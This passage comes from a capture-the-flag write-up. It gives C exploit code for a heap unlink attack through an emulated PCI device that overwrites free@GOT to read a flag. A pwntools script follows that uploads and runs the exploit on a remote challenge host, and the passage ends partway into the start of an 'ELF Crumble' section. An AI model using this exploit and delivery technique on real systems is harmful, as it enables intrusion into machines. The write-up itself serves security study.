</span></span><span class=line><span class=cl>	<span class=kt>off_t</span> <span class=n>target</span> <span class=o>=</span> <span class=p>((</span><span class=n>index</span> <span class=o>&amp;</span> <span class=mh>0xF</span><span class=p>)</span> <span class=o>&lt;&lt;</span> <span class=mi>16</span><span class=p>)</span> <span class=o>|</span> <span class=p>((</span><span class=mi>1</span> <span class=o>&amp;</span> <span class=mh>0xF</span><span class=p>)</span> <span class=o>&lt;&lt;</span> <span class=mi>20</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>pci_write</span><span class=p>(</span><span class=n>map_base</span><span class=p>,</span> <span class=n>target</span><span class=p>,</span> <span class=sc>&#39;w&#39;</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// read from pointer: read memory
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kt>void</span> <span class=nf>myread</span><span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=n>map_base</span><span class=p>,</span> <span class=kt>int</span> <span class=n>index</span><span class=p>,</span> <span class=kt>int</span> <span class=n>offset</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=c1>// read 4 bytes, unused
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=kt>off_t</span> <span class=n>target</span> <span class=o>=</span> <span class=p>((</span><span class=n>index</span> <span class=o>&amp;</span> <span class=mh>0xF</span><span class=p>)</span> <span class=o>&lt;&lt;</span> <span class=mi>16</span><span class=p>)</span> <span class=o>|</span> <span class=n>offset</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=nf>pci_read</span><span class=p>(</span><span class=n>map_base</span><span class=p>,</span> <span class=n>target</span><span class=p>,</span> <span class=sc>&#39;d&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span> <span class=o>**</span><span class=n>argv</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=kt>int</span> <span class=n>fd</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=kt>void</span> <span class=o>*</span><span class=n>map_base</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=kt>char</span> <span class=o>*</span><span class=n>filename</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=kt>off_t</span> <span class=n>target</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=kt>int</span> <span class=n>access_type</span> <span class=o>=</span> <span class=sc>&#39;w&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>filename</span> <span class=o>=</span> <span class=s>&#34;/sys/devices/pci0000:00/0000:00:04.0/resource0&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>target</span> <span class=o>=</span> <span class=mh>0x0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>access_type</span> <span class=o>=</span> <span class=sc>&#39;w&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>argc</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>if</span><span class=p>((</span><span class=n>fd</span> <span class=o>=</span> <span class=nf>open</span><span class=p>(</span><span class=n>filename</span><span class=p>,</span> <span class=n>O_RDWR</span> <span class=o>|</span> <span class=n>O_SYNC</span><span class=p>))</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=n>PRINT_ERROR</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=nf>printf</span><span class=p>(</span><span class=s>&#34;%s opened.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>filename</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Target offset is 0x%x, page size is %ld</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=p>(</span><span class=kt>int</span><span class=p>)</span> <span class=n>target</span><span class=p>,</span> <span class=nf>sysconf</span><span class=p>(</span><span class=n>_SC_PAGE_SIZE</span><span class=p>));</span>
</span></span><span class=line><span class=cl>	<span class=nf>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1>// map device memory
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=nf>printf</span><span class=p>(</span><span class=s>&#34;mmap(%d, %ld, 0x%x, 0x%x, %d, 0x%x)</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=n>MAP_SIZE</span><span class=p>,</span> <span class=n>PROT_READ</span> <span class=o>|</span> <span class=n>PROT_WRITE</span><span class=p>,</span> <span class=n>MAP_SHARED</span><span class=p>,</span> <span class=n>fd</span><span class=p>,</span> <span class=p>(</span><span class=kt>int</span><span class=p>)</span> <span class=n>target</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>map_base</span> <span class=o>=</span> <span class=nf>mmap</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>MAP_SIZE</span><span class=p>,</span> <span class=n>PROT_READ</span> <span class=o>|</span> <span class=n>PROT_WRITE</span><span class=p>,</span> <span class=n>MAP_SHARED</span><span class=p>,</span> <span class=n>fd</span><span class=p>,</span> <span class=n>target</span> <span class=o>&amp;</span> <span class=o>~</span><span class=n>MAP_MASK</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span><span class=p>(</span><span class=n>map_base</span> <span class=o>==</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=n>PRINT_ERROR</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=nf>printf</span><span class=p>(</span><span class=s>&#34;PCI Memory mapped to address 0x%08lx.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>long</span><span class=p>)</span> <span class=n>map_base</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Clearing bins</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=c1>// clear malloc bins to make sure we will have consecutive chunks
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=kt>int</span> <span class=n>i</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=k>for</span> <span class=p>(</span><span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mi>2000</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=nf>mall</span><span class=p>(</span><span class=n>map_base</span><span class=p>,</span> <span class=n>i</span> <span class=o>%</span> <span class=mi>4</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1>// we now have some heap pointers at the indexes 0,1,2,3
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Starting exploit</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1>// struct chunk_structure {
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=c1>//   size_t prev_size;
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=c1>//   size_t size;
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=c1>//   struct chunk_structure *fd;
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=c1>//   struct chunk_structure *bk;
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=c1>//   char buf[10];               // padding
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=c1>// };
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>	<span class=c1>// First forge a fake chunk starting at chunk1
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=c1>// Need to setup fd and bk pointers to pass the unlink security check
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=c1>//fake_chunk = (struct chunk_structure *)chunk1;
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=c1>//fake_chunk-&gt;fd = (struct chunk_structure *)(&amp;chunk1 - 3); // Ensures P-&gt;fd-&gt;bk == P
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=c1>//fake_chunk-&gt;bk = (struct chunk_structure *)(&amp;chunk1 - 2); // Ensures P-&gt;bk-&gt;fd == P
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>	<span class=c1>// fake chunk prev_size = 0 (probably not needed)
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=nf>write_heap</span><span class=p>(</span><span class=n>map_base</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>write_heap</span><span class=p>(</span><span class=n>map_base</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>4</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=c1>// fake chunk size = 0x80, NON_MAIN_ARENA and PREV_INUSE flags are set
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=nf>write_heap</span><span class=p>(</span><span class=n>map_base</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mh>0x85</span><span class=p>,</span> <span class=mi>8</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>write_heap</span><span class=p>(</span><span class=n>map_base</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>12</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=c1>// write &amp;chunk1 - 3 (0x1317928) in chunk1 + 16
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=nf>write_heap</span><span class=p>(</span><span class=n>map_base</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mh>0x1317928</span><span class=p>,</span> <span class=mi>16</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=c1>// write &amp;chunk1 - 2 (0x1317930) in chunk1 + 24
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=nf>write_heap</span><span class=p>(</span><span class=n>map_base</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mh>0x1317930</span><span class=p>,</span> <span class=mi>24</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1>// Next modify the header of chunk2 to pass all security checks
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=c1>//chunk2_hdr = (struct chunk_structure *)(chunk2 - 2);
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=c1>//chunk2_hdr-&gt;prev_size = 0x80;  // chunk1&#39;s data region size
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=c1>//chunk2_hdr-&gt;size &amp;= ~1;        // Unsetting prev_in_use bit
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>	<span class=c1>// chunk2 prev_size = 0x80
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=nf>write_heap</span><span class=p>(</span><span class=n>map_base</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=c1>// unset PREV_INUSE bit for chunk2
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=nf>write_heap</span><span class=p>(</span><span class=n>map_base</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mh>0x94</span><span class=p>,</span> <span class=mh>0x88</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1>// Now, when chunk2 is freed, attacker&#39;s fake chunk is &#39;unlinked&#39;
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=c1>// This results in chunk1 pointer pointing to chunk1 - 3
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=c1>// i.e. chunk1[3] now contains chunk1 itself.
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=c1>// We then make chunk1 point to some victim&#39;s data
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=c1>//free(chunk2);
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=nf>myfree</span><span class=p>(</span><span class=n>map_base</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Pointer overwritten</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1>// overwrite pointer at index 1 with the address of free@GOT
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=nf>write_heap</span><span class=p>(</span><span class=n>map_base</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mh>0x011301A0</span><span class=p>,</span> <span class=mi>32</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>write_heap</span><span class=p>(</span><span class=n>map_base</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>36</span><span class=p>);</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1>// overwrite GOT entry of free with our target function
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=nf>write_heap</span><span class=p>(</span><span class=n>map_base</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mh>0x6e65f9</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>write_heap</span><span class=p>(</span><span class=n>map_base</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>4</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Reading flag</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>myfree</span><span class=p>(</span><span class=n>map_base</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	
</span></span><span class=line><span class=cl>	<span class=k>if</span><span class=p>(</span><span class=nf>munmap</span><span class=p>(</span><span class=n>map_base</span><span class=p>,</span> <span class=n>MAP_SIZE</span><span class=p>)</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=n>PRINT_ERROR</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=nf>close</span><span class=p>(</span><span class=n>fd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Script to load the exploit in qemu and execute it:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>__future__</span> <span class=kn>import</span> <span class=n>print_function</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>struct</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hashlib</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base64</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>subprocess</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>time</span> <span class=kn>import</span> <span class=n>sleep</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>host</span> <span class=o>=</span> <span class=s1>&#39;11d9f496.quals2018.oooverflow.io&#39;</span>
</span></span><span class=line><span class=cl><span class=n>port</span> <span class=o>=</span>  <span class=mi>31337</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>chunkstring</span><span class=p>(</span><span class=n>string</span><span class=p>,</span> <span class=n>length</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>(</span><span class=n>string</span><span class=p>[</span><span class=mi>0</span><span class=o>+</span><span class=n>i</span><span class=p>:</span><span class=n>length</span><span class=o>+</span><span class=n>i</span><span class=p>]</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>string</span><span class=p>),</span> <span class=n>length</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>buildexploit</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>subprocess</span><span class=o>.</span><span class=n>check_call</span><span class=p>(</span><span class=s2>&#34;musl-gcc exploit.c -Os -static -o exploit&#34;</span><span class=p>,</span><span class=n>shell</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>    
</span></span><span class=line><span class=cl>    <span class=n>subprocess</span><span class=o>.</span><span class=n>check_call</span><span class=p>(</span><span class=s2>&#34;tar cfz exploit.tar.gz exploit&#34;</span><span class=p>,</span><span class=n>shell</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;./exploit.tar.gz&#34;</span><span class=p>,</span> <span class=s2>&#34;rb&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>exploit</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>b64exploit</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64encode</span><span class=p>(</span><span class=n>exploit</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>exploit</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s2>&#34;base64&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>b64exploit</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>exploit</span><span class=p>(</span><span class=n>send</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>exp</span> <span class=o>=</span> <span class=n>buildexploit</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>sleep</span><span class=p>(</span><span class=mi>10</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;chunks...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>chunk</span> <span class=ow>in</span> <span class=n>chunkstring</span><span class=p>(</span><span class=n>exp</span><span class=p>,</span> <span class=mi>700</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>sleep</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>i</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>        <span class=n>send</span><span class=p>(</span><span class=s2>&#34;echo -n </span><span class=se>\&#34;</span><span class=si>{}</span><span class=se>\&#34;</span><span class=s2> &gt;&gt; exploitb64&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>chunk</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>sleep</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;almost&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>send</span><span class=p>(</span><span class=s2>&#34;base64 -d exploitb64 &gt; ./exploit.tar.gz&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sleep</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>send</span><span class=p>(</span><span class=s2>&#34;tar xf exploit.tar.gz&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sleep</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>send</span><span class=p>(</span><span class=s2>&#34;chmod +x ./exploit&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sleep</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>send</span><span class=p>(</span><span class=s2>&#34;ls&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sleep</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>send</span><span class=p>(</span><span class=s2>&#34;./exploit&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>pow_hash</span><span class=p>(</span><span class=n>challenge</span><span class=p>,</span> <span class=n>solution</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>sha256</span><span class=p>(</span><span class=n>challenge</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;ascii&#39;</span><span class=p>)</span> <span class=o>+</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s1>&#39;&lt;Q&#39;</span><span class=p>,</span> <span class=n>solution</span><span class=p>))</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>check_pow</span><span class=p>(</span><span class=n>challenge</span><span class=p>,</span> <span class=n>n</span><span class=p>,</span> <span class=n>solution</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>h</span> <span class=o>=</span> <span class=n>pow_hash</span><span class=p>(</span><span class=n>challenge</span><span class=p>,</span> <span class=n>solution</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>h</span><span class=p>,</span> <span class=mi>16</span><span class=p>)</span> <span class=o>%</span> <span class=p>(</span><span class=mi>2</span><span class=o>**</span><span class=n>n</span><span class=p>))</span> <span class=o>==</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>solve_pow</span><span class=p>(</span><span class=n>challenge</span><span class=p>,</span> <span class=n>n</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>candidate</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>check_pow</span><span class=p>(</span><span class=n>challenge</span><span class=p>,</span> <span class=n>n</span><span class=p>,</span> <span class=n>candidate</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>candidate</span>
</span></span><span class=line><span class=cl>        <span class=n>candidate</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>conn</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=n>host</span><span class=p>,</span><span class=n>port</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>conn</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Challenge: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>challenge</span> <span class=o>=</span> <span class=n>conn</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)[:</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>conn</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;n: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>n</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>conn</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)[:</span><span class=o>-</span><span class=mi>1</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;Solving challenge: &#34;</span><span class=si>{}</span><span class=s1>&#34;, n: </span><span class=si>{}</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>challenge</span><span class=p>,</span> <span class=n>n</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>solution</span> <span class=o>=</span> <span class=n>solve_pow</span><span class=p>(</span><span class=n>challenge</span><span class=p>,</span> <span class=n>n</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;Solution: </span><span class=si>{}</span><span class=s1> -&gt; </span><span class=si>{}</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>solution</span><span class=p>,</span> <span class=n>pow_hash</span><span class=p>(</span><span class=n>challenge</span><span class=p>,</span> <span class=n>solution</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>    <span class=n>conn</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>solution</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>exploit</span><span class=p>(</span><span class=n>conn</span><span class=o>.</span><span class=n>sendline</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>conn</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></div><h2 class="relative group">ELF Crumble<div id=elf-crumble class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#elf-crumble aria-label=Anchor>#</a></span></h2><p>The challenge present us with 8 fragment files and a &ldquo;broken&rdquo; binary.
A quick view of the binary shows that the first part is missing and replaced with X:</p><pre tabindex=0><code>000005a0  55 89 e5 5d e9 57 ff ff  ff 8b 14 24 c3 58 58 58  |U..].W.....$.XXX|
000005b0  58 58 58 58 58 58 58 58  58 58 58 58 58 58 58 58  |XXXXXXXXXXXXXXXX|
*
000008d0  58 58 58 58 8b 04 24 c3  66 90 66 90 66 90 66 90  |XXXX..$.f.f.f.f.|
000008e0  55 57 56 53 e8 c7 fb ff  ff 81 c3 e7 16 00 00 83  |UWVS............|
</code></pre><p>Without thinking too much we launched a bruteforce script:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>itertools</span> <span class=kn>import</span> <span class=n>permutations</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>subprocess</span> <span class=kn>import</span> <span class=n>Popen</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>tqdm</span> <span class=kn>import</span> <span class=n>tqdm</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>make_executable</span><span class=p>(</span><span class=n>path</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>mode</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>stat</span><span class=p>(</span><span class=n>path</span><span class=p>)</span><span class=o>.</span><span class=n>st_mode</span>
